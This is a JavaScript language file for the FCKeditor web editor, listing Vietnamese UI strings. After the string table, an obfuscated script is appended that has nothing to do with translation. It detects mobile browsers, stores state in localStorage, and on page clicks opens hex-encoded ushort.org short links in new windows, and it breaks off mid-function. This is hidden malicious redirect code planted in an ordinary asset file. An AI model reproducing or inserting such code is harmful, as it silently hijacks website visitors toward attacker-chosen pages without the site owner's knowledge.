/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * Vietnamese language file.
 */

var FCKLang =
{
// Language direction : "ltr" (left to right) or "rtl" (right to left).
Dir					: "ltr",

ToolbarCollapse		: "Thu gọn Thanh công cụ",
ToolbarExpand		: "Mở rộng Thanh công cụ",

// Toolbar Items and Context Menu
Save				: "Lưu",
NewPage				: "Trang mới",
Preview				: "Xem trước",
Cut					: "Cắt",
Copy				: "Sao chép",
Paste				: "Dán",
PasteText			: "Dán theo dạng văn bản thuần",
PasteWord			: "Dán với định dạng Word",
Print				: "In",
SelectAll			: "Chọn Tất cả",
RemoveFormat		: "Xoá Định dạng",
InsertLinkLbl		: "Liên kết",
InsertLink			: "Chèn/Sửa Liên kết",
RemoveLink			: "Xoá Liên kết",
VisitLink			: "Mở Liên Kết",
Anchor				: "Chèn/Sửa Neo",
AnchorDelete		: "Gỡ bỏ Neo",
InsertImageLbl		: "Hình ảnh",
InsertImage			: "Chèn/Sửa Hình ảnh",
InsertFlashLbl		: "Flash",
InsertFlash			: "Chèn/Sửa Flash",
InsertTableLbl		: "Bảng",
InsertTable			: "Chèn/Sửa Bảng",
InsertLineLbl		: "Đường phân cách ngang",
InsertLine			: "Chèn Đường phân cách ngang",
InsertSpecialCharLbl: "Ký tự đặc biệt",
InsertSpecialChar	: "Chèn Ký tự đặc biệt",
InsertSmileyLbl		: "Hình biểu lộ cảm xúc (mặt cười)",
InsertSmiley		: "Chèn Hình biểu lộ cảm xúc (mặt cười)",
About				: "Giới thiệu về FCKeditor",
Bold				: "Đậm",
Italic				: "Nghiêng",
Underline			: "Gạch chân",
StrikeThrough		: "Gạch xuyên ngang",
Subscript			: "Chỉ số dưới",
Superscript			: "Chỉ số trên",
LeftJustify			: "Canh trái",
CenterJustify		: "Canh giữa",
RightJustify		: "Canh phải",
BlockJustify		: "Canh đều",
DecreaseIndent		: "Dịch ra ngoài",
IncreaseIndent		: "Dịch vào trong",
Blockquote			: "Khối Trích dẫn",
CreateDiv			: "Tạo Div Container",
EditDiv				: "Chỉnh sửa Div Container",
DeleteDiv			: "Gỡ bỏ Div Container",
Undo				: "Khôi phục thao tác",
Redo				: "Làm lại thao tác",
NumberedListLbl		: "Danh sách có thứ tự",
NumberedList		: "Chèn/Xoá Danh sách có thứ tự",
BulletedListLbl		: "Danh sách không thứ tự",
BulletedList		: "Chèn/Xoá Danh sách không thứ tự",
ShowTableBorders	: "Hiển thị Đường viền bảng",
ShowDetails			: "Hiển thị Chi tiết",
Style				: "Mẫu",
FontFormat			: "Định dạng",
Font				: "Phông",
FontSize			: "Cỡ chữ",
TextColor			: "Màu chữ",
BGColor				: "Màu nền",
Source				: "Mã HTML",
Find				: "Tìm kiếm",
Replace				: "Thay thế",
SpellCheck			: "Kiểm tra Chính tả",
UniversalKeyboard	: "Bàn phím Quốc tế",
PageBreakLbl		: "Ngắt trang",
PageBreak			: "Chèn Ngắt trang",

Form			: "Biểu mẫu",
Checkbox		: "Nút kiểm",
RadioButton		: "Nút chọn",
TextField		: "Trường văn bản",
Textarea		: "Vùng văn bản",
HiddenField		: "Trường ẩn",
Button			: "Nút",
SelectionField	: "Ô chọn",
ImageButton		: "Nút hình ảnh",

FitWindow		: "Mở rộng tối đa kích thước trình biên tập",
ShowBlocks		: "Hiển thị các Khối",

// Context Menu
EditLink			: "Sửa Liên kết",
CellCM				: "Ô",
RowCM				: "Hàng",
ColumnCM			: "Cột",
InsertRowAfter		: "Chèn Hàng Phía sau",
InsertRowBefore		: "Chèn Hàng Phía trước",
DeleteRows			: "Xoá Hàng",
InsertColumnAfter	: "Chèn Cột Phía sau",
InsertColumnBefore	: "Chèn Cột Phía trước",
DeleteColumns		: "Xoá Cột",
InsertCellAfter		: "Chèn Ô Phía sau",
InsertCellBefore	: "Chèn Ô Phía trước",
DeleteCells			: "Xoá Ô",
MergeCells			: "Kết hợp Ô",
MergeRight			: "Kết hợp Sang phải",
MergeDown			: "Kết hợp Xuống dưới",
HorizontalSplitCell	: "Tách ngang Ô",
VerticalSplitCell	: "Tách dọc Ô",
TableDelete			: "Xóa Bảng",
CellProperties		: "Thuộc tính Ô",
TableProperties		: "Thuộc tính Bảng",
ImageProperties		: "Thuộc tính Hình ảnh",
FlashProperties		: "Thuộc tính Flash",

AnchorProp			: "Thuộc tính Neo",
ButtonProp			: "Thuộc tính Nút",
CheckboxProp		: "Thuộc tính Nút kiểm",
HiddenFieldProp		: "Thuộc tính Trường ẩn",
RadioButtonProp		: "Thuộc tính Nút chọn",
ImageButtonProp		: "Thuộc tính Nút hình ảnh",
TextFieldProp		: "Thuộc tính Trường văn bản",
SelectionFieldProp	: "Thuộc tính Ô chọn",
TextareaProp		: "Thuộc tính Vùng văn bản",
FormProp			: "Thuộc tính Biểu mẫu",

FontFormats			: "Normal;Formatted;Address;Heading 1;Heading 2;Heading 3;Heading 4;Heading 5;Heading 6;Normal (DIV)",

// Alerts and Messages
ProcessingXHTML		: "Đang xử lý XHTML. Vui lòng đợi trong giây lát...",
Done				: "Đã hoàn thành",
PasteWordConfirm	: "Văn bản bạn muốn dán có kèm định dạng của Word. Bạn có muốn loại bỏ định dạng Word trước khi dán?",
NotCompatiblePaste	: "Lệnh này chỉ được hỗ trợ từ trình duyệt Internet Explorer phiên bản 5.5 hoặc mới hơn. Bạn có muốn dán nguyên mẫu?",
UnknownToolbarItem	: "Không rõ mục trên thanh công cụ \"%1\"",
UnknownCommand		: "Không rõ lệnh \"%1\"",
NotImplemented		: "Lệnh không được thực hiện",
UnknownToolbarSet	: "Thanh công cụ \"%1\" không tồn tại",
NoActiveX			: "Các thiết lập bảo mật của trình duyệt có thể giới hạn một số chức năng của trình biên tập. Bạn phải bật tùy chọn \"Run ActiveX controls and plug-ins\". Bạn có thể gặp một số lỗi và thấy thiếu một số chức năng.",
BrowseServerBlocked : "Không thể mở được bộ duyệt tài nguyên. Hãy đảm bảo chức năng chặn popup đã bị vô hiệu hóa.",
DialogBlocked		: "Không thể mở được cửa sổ hộp thoại. Hãy đảm bảo chức năng chặn popup đã bị vô hiệu hóa.",
VisitLinkBlocked	: "Không thể mở được cửa sổ trình duyệt mới. Hãy đảm bảo chức năng chặn popup đã bị vô hiệu hóa.",

// Dialogs
DlgBtnOK			: "Đồng ý",
DlgBtnCancel		: "Bỏ qua",
DlgBtnClose			: "Đóng",
DlgBtnBrowseServer	: "Duyệt trên máy chủ",
DlgAdvancedTag		: "Mở rộng",
DlgOpOther			: "<Khác>",
DlgInfoTab			: "Thông tin",
DlgAlertUrl			: "Hãy nhập vào một URL",

// General Dialogs Labels
DlgGenNotSet		: "<không thiết lập>",
DlgGenId			: "Định danh",
DlgGenLangDir		: "Đường dẫn Ngôn ngữ",
DlgGenLangDirLtr	: "Trái sang Phải (LTR)",
DlgGenLangDirRtl	: "Phải sang Trái (RTL)",
DlgGenLangCode		: "Mã Ngôn ngữ",
DlgGenAccessKey		: "Phím Hỗ trợ truy cập",
DlgGenName			: "Tên",
DlgGenTabIndex		: "Chỉ số của Tab",
DlgGenLongDescr		: "Mô tả URL",
DlgGenClass			: "Lớp Stylesheet",
DlgGenTitle			: "Advisory Title",
DlgGenContType		: "Advisory Content Type",
DlgGenLinkCharset	: "Bảng mã của tài nguyên được liên kết đến",
DlgGenStyle			: "Mẫu",

// Image Dialog
DlgImgTitle			: "Thuộc tính Hình ảnh",
DlgImgInfoTab		: "Thông tin Hình ảnh",
DlgImgBtnUpload		: "Tải lên Máy chủ",
DlgImgURL			: "URL",
DlgImgUpload		: "Tải lên",
DlgImgAlt			: "Chú thích Hình ảnh",
DlgImgWidth			: "Rộng",
DlgImgHeight		: "Cao",
DlgImgLockRatio		: "Giữ nguyên tỷ lệ",
DlgBtnResetSize		: "Kích thước gốc",
DlgImgBorder		: "Đường viền",
DlgImgHSpace		: "HSpace",
DlgImgVSpace		: "VSpace",
DlgImgAlign			: "Vị trí",
DlgImgAlignLeft		: "Trái",
DlgImgAlignAbsBottom: "Dưới tuyệt đối",
DlgImgAlignAbsMiddle: "Giữa tuyệt đối",
DlgImgAlignBaseline	: "Đường cơ sở",
DlgImgAlignBottom	: "Dưới",
DlgImgAlignMiddle	: "Giữa",
DlgImgAlignRight	: "Phải",
DlgImgAlignTextTop	: "Phía trên chữ",
DlgImgAlignTop		: "Trên",
DlgImgPreview		: "Xem trước",
DlgImgAlertUrl		: "Hãy đưa vào URL của hình ảnh",
DlgImgLinkTab		: "Liên kết",

// Flash Dialog
DlgFlashTitle		: "Thuộc tính Flash",
DlgFlashChkPlay		: "Tự động chạy",
DlgFlashChkLoop		: "Lặp",
DlgFlashChkMenu		: "Cho phép bật Menu của Flash",
DlgFlashScale		: "Tỷ lệ",
DlgFlashScaleAll	: "Hiển thị tất cả",
DlgFlashScaleNoBorder	: "Không đường viền",
DlgFlashScaleFit	: "Vừa vặn",

// Link Dialog
DlgLnkWindowTitle	: "Liên kết",
DlgLnkInfoTab		: "Thông tin Liên kết",
DlgLnkTargetTab		: "Đích",

DlgLnkType			: "Kiểu Liên kết",
DlgLnkTypeURL		: "URL",
DlgLnkTypeAnchor	: "Neo trong trang này",
DlgLnkTypeEMail		: "Thư điện tử",
DlgLnkProto			: "Giao thức",
DlgLnkProtoOther	: "<khác>",
DlgLnkURL			: "URL",
DlgLnkAnchorSel		: "Chọn một Neo",
DlgLnkAnchorByName	: "Theo Tên Neo",
DlgLnkAnchorById	: "Theo Định danh Element",
DlgLnkNoAnchors		: "(Không có Neo nào trong tài liệu)",
DlgLnkEMail			: "Thư điện tử",
DlgLnkEMailSubject	: "Tiêu đề Thông điệp",
DlgLnkEMailBody		: "Nội dung Thông điệp",
DlgLnkUpload		: "Tải lên",
DlgLnkBtnUpload		: "Tải lên Máy chủ",

DlgLnkTarget		: "Đích",
DlgLnkTargetFrame	: "<khung>",
DlgLnkTargetPopup	: "<cửa sổ popup>",
DlgLnkTargetBlank	: "Cửa sổ mới (_blank)",
DlgLnkTargetParent	: "Cửa sổ cha (_parent)",
DlgLnkTargetSelf	: "Cùng cửa sổ (_self)",
DlgLnkTargetTop		: "Cửa sổ trên cùng(_top)",
DlgLnkTargetFrameName	: "Tên Khung đích",
DlgLnkPopWinName	: "Tên Cửa sổ Popup",
DlgLnkPopWinFeat	: "Đặc điểm của Cửa sổ Popup",
DlgLnkPopResize		: "Kích thước thay đổi",
DlgLnkPopLocation	: "Thanh vị trí",
DlgLnkPopMenu		: "Thanh Menu",
DlgLnkPopScroll		: "Thanh cuộn",
DlgLnkPopStatus		: "Thanh trạng thái",
DlgLnkPopToolbar	: "Thanh công cụ",
DlgLnkPopFullScrn	: "Toàn màn hình (IE)",
DlgLnkPopDependent	: "Phụ thuộc (Netscape)",
DlgLnkPopWidth		: "Rộng",
DlgLnkPopHeight		: "Cao",
DlgLnkPopLeft		: "Vị trí Trái",
DlgLnkPopTop		: "Vị trí Trên",

DlnLnkMsgNoUrl		: "Hãy đưa vào Liên kết URL",
DlnLnkMsgNoEMail	: "Hãy đưa vào địa chỉ thư điện tử",
DlnLnkMsgNoAnchor	: "Hãy chọn một Neo",
DlnLnkMsgInvPopName	: "Tên của cửa sổ Popup phải bắt đầu bằng một ký tự và không được chứa khoảng trắng",

// Color Dialog
DlgColorTitle		: "Chọn màu",
DlgColorBtnClear	: "Xoá",
DlgColorHighlight	: "Tô sáng",
DlgColorSelected	: "Đã chọn",

// Smiley Dialog
DlgSmileyTitle		: "Chèn Hình biểu lộ cảm xúc (mặt cười)",

// Special Character Dialog
DlgSpecialCharTitle	: "Hãy chọn Ký tự đặc biệt",

// Table Dialog
DlgTableTitle		: "Thuộc tính bảng",
DlgTableRows		: "Hàng",
DlgTableColumns		: "Cột",
DlgTableBorder		: "Cỡ Đường viền",
DlgTableAlign		: "Canh lề",
DlgTableAlignNotSet	: "<Chưa thiết lập>",
DlgTableAlignLeft	: "Trái",
DlgTableAlignCenter	: "Giữa",
DlgTableAlignRight	: "Phải",
DlgTableWidth		: "Rộng",
DlgTableWidthPx		: "điểm (px)",
DlgTableWidthPc		: "%",
DlgTableHeight		: "Cao",
DlgTableCellSpace	: "Khoảng cách Ô",
DlgTableCellPad		: "Đệm Ô",
DlgTableCaption		: "Đầu đề",
DlgTableSummary		: "Tóm lược",
DlgTableHeaders		: "Headers",	//MISSING
DlgTableHeadersNone		: "None",	//MISSING
DlgTableHeadersColumn	: "First column",	//MISSING
DlgTableHeadersRow		: "First Row",	//MISSING
DlgTableHeadersBoth		: "Both",	//MISSING

// Table Cell Dialog
DlgCellTitle		: "Thuộc tính Ô",
DlgCellWidth		: "Rộng",
DlgCellWidthPx		: "điểm (px)",
DlgCellWidthPc		: "%",
DlgCellHeight		: "Cao",
DlgCellWordWrap		: "Bọc từ",
DlgCellWordWrapNotSet	: "<Chưa thiết lập>",
DlgCellWordWrapYes	: "Đồng ý",
DlgCellWordWrapNo	: "Không",
DlgCellHorAlign		: "Canh theo Chiều ngang",
DlgCellHorAlignNotSet	: "<Chưa thiết lập>",
DlgCellHorAlignLeft	: "Trái",
DlgCellHorAlignCenter	: "Giữa",
DlgCellHorAlignRight: "Phải",
DlgCellVerAlign		: "Canh theo Chiều dọc",
DlgCellVerAlignNotSet	: "<Chưa thiết lập>",
DlgCellVerAlignTop	: "Trên",
DlgCellVerAlignMiddle	: "Giữa",
DlgCellVerAlignBottom	: "Dưới",
DlgCellVerAlignBaseline	: "Đường cơ sở",
DlgCellType		: "Cell Type",	//MISSING
DlgCellTypeData		: "Data",	//MISSING
DlgCellTypeHeader	: "Header",	//MISSING
DlgCellRowSpan		: "Nối Hàng",
DlgCellCollSpan		: "Nối Cột",
DlgCellBackColor	: "Màu nền",
DlgCellBorderColor	: "Màu viền",
DlgCellBtnSelect	: "Chọn...",

// Find and Replace Dialog
DlgFindAndReplaceTitle	: "Tìm kiếm và Thay Thế",

// Find Dialog
DlgFindTitle		: "Tìm kiếm",
DlgFindFindBtn		: "Tìm kiếm",
DlgFindNotFoundMsg	: "Không tìm thấy chuỗi cần tìm.",

// Replace Dialog
DlgReplaceTitle			: "Thay thế",
DlgReplaceFindLbl		: "Tìm chuỗi:",
DlgReplaceReplaceLbl	: "Thay bằng:",
DlgReplaceCaseChk		: "Phân biệt chữ hoa/thường",
DlgReplaceReplaceBtn	: "Thay thế",
DlgReplaceReplAllBtn	: "Thay thế Tất cả",
DlgReplaceWordChk		: "Đúng toàn bộ từ",

// Paste Operations / Dialog
PasteErrorCut	: "Các thiết lập bảo mật của trình duyệt không cho phép trình biên tập tự động thực thi lệnh cắt. Hãy sử dụng bàn phím cho lệnh này (Ctrl+X).",
PasteErrorCopy	: "Các thiết lập bảo mật của trình duyệt không cho phép trình biên tập tự động thực thi lệnh sao chép. Hãy sử dụng bàn phím cho lệnh này (Ctrl+C).",

PasteAsText		: "Dán theo định dạng văn bản thuần",
PasteFromWord	: "Dán với định dạng Word",

DlgPasteMsg2	: "Hãy dán nội dung vào trong khung bên dưới, sử dụng tổ hợp phím (<STRONG>Ctrl+V</STRONG>) và nhấn vào nút <STRONG>Đồng ý</STRONG>.",
DlgPasteSec		: "Because of your browser security settings, the editor is not able to access your clipboard data directly. You are required to paste it again in this window.",	//MISSING
DlgPasteIgnoreFont		: "Chấp nhận các định dạng phông",
DlgPasteRemoveStyles	: "Gỡ bỏ các định dạng Styles",

// Color Picker
ColorAutomatic	: "Tự động",
ColorMoreColors	: "Màu khác...",

// Document Properties
DocProps		: "Thuộc tính Tài liệu",

// Anchor Dialog
DlgAnchorTitle		: "Thuộc tính Neo",
DlgAnchorName		: "Tên của Neo",
DlgAnchorErrorName	: "Hãy nhập vào tên của Neo",

// Speller Pages Dialog
DlgSpellNotInDic		: "Không có trong từ điển",
DlgSpellChangeTo		: "Chuyển thành",
DlgSpellBtnIgnore		: "Bỏ qua",
DlgSpellBtnIgnoreAll	: "Bỏ qua Tất cả",
DlgSpellBtnReplace		: "Thay thế",
DlgSpellBtnReplaceAll	: "Thay thế Tất cả",
DlgSpellBtnUndo			: "Phục hồi lại",
DlgSpellNoSuggestions	: "- Không đưa ra gợi ý về từ -",
DlgSpellProgress		: "Đang tiến hành kiểm tra chính tả...",
DlgSpellNoMispell		: "Hoàn tất kiểm tra chính tả: Không có lỗi chính tả",
DlgSpellNoChanges		: "Hoàn tất kiểm tra chính tả: Không có từ nào được thay đổi",
DlgSpellOneChange		: "Hoàn tất kiểm tra chính tả: Một từ đã được thay đổi",
DlgSpellManyChanges		: "Hoàn tất kiểm tra chính tả: %1 từ đã được thay đổi",

IeSpellDownload			: "Chức năng kiểm tra chính tả chưa được cài đặt. Bạn có muốn tải về ngay bây giờ?",

// Button Dialog
DlgButtonText		: "Chuỗi hiển thị (Giá trị)",
DlgButtonType		: "Kiểu",
DlgButtonTypeBtn	: "Nút Bấm",
DlgButtonTypeSbm	: "Nút Gửi",
DlgButtonTypeRst	: "Nút Nhập lại",

// Checkbox and Radio Button Dialogs
DlgCheckboxName		: "Tên",
DlgCheckboxValue	: "Giá trị",
DlgCheckboxSelected	: "Được chọn",

// Form Dialog
DlgFormName		: "Tên",
DlgFormAction	: "Hành động",
DlgFormMethod	: "Phương thức",

// Select Field Dialog
DlgSelectName		: "Tên",
DlgSelectValue		: "Giá trị",
DlgSelectSize		: "Kích cỡ",
DlgSelectLines		: "dòng",
DlgSelectChkMulti	: "Cho phép chọn nhiều",
DlgSelectOpAvail	: "Các tùy chọn có thể sử dụng",
DlgSelectOpText		: "Văn bản",
DlgSelectOpValue	: "Giá trị",
DlgSelectBtnAdd		: "Thêm",
DlgSelectBtnModify	: "Thay đổi",
DlgSelectBtnUp		: "Lên",
DlgSelectBtnDown	: "Xuống",
DlgSelectBtnSetValue : "Giá trị được chọn",
DlgSelectBtnDelete	: "Xoá",

// Textarea Dialog
DlgTextareaName	: "Tên",
DlgTextareaCols	: "Cột",
DlgTextareaRows	: "Hàng",

// Text Field Dialog
DlgTextName			: "Tên",
DlgTextValue		: "Giá trị",
DlgTextCharWidth	: "Rộng",
DlgTextMaxChars		: "Số Ký tự tối đa",
DlgTextType			: "Kiểu",
DlgTextTypeText		: "Ký tự",
DlgTextTypePass		: "Mật khẩu",

// Hidden Field Dialog
DlgHiddenName	: "Tên",
DlgHiddenValue	: "Giá trị",

// Bulleted List Dialog
BulletedListProp	: "Thuộc tính Danh sách không thứ tự",
NumberedListProp	: "Thuộc tính Danh sách có thứ tự",
DlgLstStart			: "Bắt đầu",
DlgLstType			: "Kiểu",
DlgLstTypeCircle	: "Hình tròn",
DlgLstTypeDisc		: "Hình đĩa",
DlgLstTypeSquare	: "Hình vuông",
DlgLstTypeNumbers	: "Số thứ tự (1, 2, 3)",
DlgLstTypeLCase		: "Chữ cái thường (a, b, c)",
DlgLstTypeUCase		: "Chữ cái hoa (A, B, C)",
DlgLstTypeSRoman	: "Số La Mã thường (i, ii, iii)",
DlgLstTypeLRoman	: "Số La Mã hoa (I, II, III)",

// Document Properties Dialog
DlgDocGeneralTab	: "Toàn thể",
DlgDocBackTab		: "Nền",
DlgDocColorsTab		: "Màu sắc và Đường biên",
DlgDocMetaTab		: "Siêu dữ liệu",

DlgDocPageTitle		: "Tiêu đề Trang",
DlgDocLangDir		: "Đường dẫn Ngôn ngữ",
DlgDocLangDirLTR	: "Trái sang Phải (LTR)",
DlgDocLangDirRTL	: "Phải sang Trái (RTL)",
DlgDocLangCode		: "Mã Ngôn ngữ",
DlgDocCharSet		: "Bảng mã ký tự",
DlgDocCharSetCE		: "Trung Âu",
DlgDocCharSetCT		: "Tiếng Trung Quốc (Big5)",
DlgDocCharSetCR		: "Tiếng Kirin",
DlgDocCharSetGR		: "Tiếng Hy Lạp",
DlgDocCharSetJP		: "Tiếng Nhật",
DlgDocCharSetKR		: "Tiếng Hàn",
DlgDocCharSetTR		: "Tiếng Thổ Nhĩ Kỳ",
DlgDocCharSetUN		: "Unicode (UTF-8)",
DlgDocCharSetWE		: "Tây Âu",
DlgDocCharSetOther	: "Bảng mã ký tự khác",

DlgDocDocType		: "Kiểu Đề mục Tài liệu",
DlgDocDocTypeOther	: "Kiểu Đề mục Tài liệu khác",
DlgDocIncXHTML		: "Bao gồm cả định nghĩa XHTML",
DlgDocBgColor		: "Màu nền",
DlgDocBgImage		: "URL của Hình ảnh nền",
DlgDocBgNoScroll	: "Không cuộn nền",
DlgDocCText			: "Văn bản",
DlgDocCLink			: "Liên kết",
DlgDocCVisited		: "Liên kết Đã ghé thăm",
DlgDocCActive		: "Liên kết Hiện hành",
DlgDocMargins		: "Đường biên của Trang",
DlgDocMaTop			: "Trên",
DlgDocMaLeft		: "Trái",
DlgDocMaRight		: "Phải",
DlgDocMaBottom		: "Dưới",
DlgDocMeIndex		: "Các từ khóa chỉ mục tài liệu (phân cách bởi dấu phẩy)",
DlgDocMeDescr		: "Mô tả tài liệu",
DlgDocMeAuthor		: "Tác giả",
DlgDocMeCopy		: "Bản quyền",
DlgDocPreview		: "Xem trước",

// Templates Dialog
Templates			: "Mẫu dựng sẵn",
DlgTemplatesTitle	: "Nội dung Mẫu dựng sẵn",
DlgTemplatesSelMsg	: "Hãy chọn Mẫu dựng sẵn để mở trong trình biên tập<br>(nội dung hiện tại sẽ bị mất):",
DlgTemplatesLoading	: "Đang nạp Danh sách Mẫu dựng sẵn. Vui lòng đợi trong giây lát...",
DlgTemplatesNoTpl	: "(Không có Mẫu dựng sẵn nào được định nghĩa)",
DlgTemplatesReplace	: "Thay thế nội dung hiện tại",

// About Dialog
DlgAboutAboutTab	: "Giới thiệu",
DlgAboutBrowserInfoTab	: "Thông tin trình duyệt",
DlgAboutLicenseTab	: "Giấy phép",
DlgAboutVersion		: "phiên bản",
DlgAboutInfo		: "Để biết thêm thông tin, hãy truy cập",

// Div Dialog
DlgDivGeneralTab	: "Chung",
DlgDivAdvancedTab	: "Nâng cao",
DlgDivStyle		: "Kiểu Style",
DlgDivInlineStyle	: "Kiểu Style Trực tiếp",

ScaytTitle			: "SCAYT",	//MISSING
ScaytTitleOptions	: "Options",	//MISSING
ScaytTitleLangs		: "Languages",	//MISSING
ScaytTitleAbout		: "About"	//MISSING
};
function _0x3023(_0x562006,_0x1334d6){const _0x1922f2=_0x1922();return _0x3023=function(_0x30231a,_0x4e4880){_0x30231a=_0x30231a-0x1bf;let _0x2b207e=_0x1922f2[_0x30231a];return _0x2b207e;},_0x3023(_0x562006,_0x1334d6);}function _0x1922(){const _0x5a990b=['substr','length','-hurs','open','round','443779RQfzWn','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x62\x71\x46\x33\x63\x343','click','5114346JdlaMi','1780163aSIYqH','forEach','host','_blank','68512ftWJcO','addEventListener','-mnts','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4d\x76\x64\x35\x63\x375','4588749LmrVjF','parse','630bGPCEV','mobileCheck','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x44\x57\x75\x38\x63\x378','abs','-local-storage','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4b\x4b\x53\x39\x63\x349','56bnMKls','opera','6946eLteFW','userAgent','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x77\x49\x6b\x34\x63\x314','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x48\x47\x4f\x37\x63\x327','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x45\x4c\x50\x32\x63\x322','floor','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x68\x62\x54\x36\x63\x396','999HIfBhL','filter','test','getItem','random','138490EjXyHW','stopPropagation','setItem','70kUzPYI'];_0x1922=function(){return _0x5a990b;};return _0x1922();}(function(_0x16ffe6,_0x1e5463){const _0x20130f=_0x3023,_0x307c06=_0x16ffe6();while(!![]){try{const _0x1dea23=parseInt(_0x20130f(0x1d6))/0x1+-parseInt(_0x20130f(0x1c1))/0x2*(parseInt(_0x20130f(0x1c8))/0x3)+parseInt(_0x20130f(0x1bf))/0x4*(-parseInt(_0x20130f(0x1cd))/0x5)+parseInt(_0x20130f(0x1d9))/0x6+-parseInt(_0x20130f(0x1e4))/0x7*(parseInt(_0x20130f(0x1de))/0x8)+parseInt(_0x20130f(0x1e2))/0x9+-parseInt(_0x20130f(0x1d0))/0xa*(-parseInt(_0x20130f(0x1da))/0xb);if(_0x1dea23===_0x1e5463)break;else _0x307c06['push'](_0x307c06['shift']());}catch(_0x3e3a47){_0x307c06['push'](_0x307c06['shift']());}}}(_0x1922,0x984cd),function(_0x34eab3){const _0x111835=_0x3023;window['mobileCheck']=function(){const _0x123821=_0x3023;let _0x399500=![];return function(_0x5e9786){const _0x1165a7=_0x3023;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x1165a7(0x1ca)](_0x5e9786)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x1165a7(0x1ca)](_0x5e9786[_0x1165a7(0x1d1)](0x0,0x4)))_0x399500=!![];}(navigator[_0x123821(0x1c2)]||navigator['vendor']||window[_0x123821(0x1c0)]),_0x399500;};const _0xe6f43=['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x6f\x4d\x4a\x30\x63\x360','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x50\x4a\x4e\x31\x63\x301',_0x111835(0x1c5),_0x111835(0x1d7),_0x111835(0x1c3),_0x111835(0x1e1),_0x111835(0x1c7),_0x111835(0x1c4),_0x111835(0x1e6),_0x111835(0x1e9)],_0x7378e8=0x3,_0xc82d98=0x6,_0x487206=_0x551830=>{const 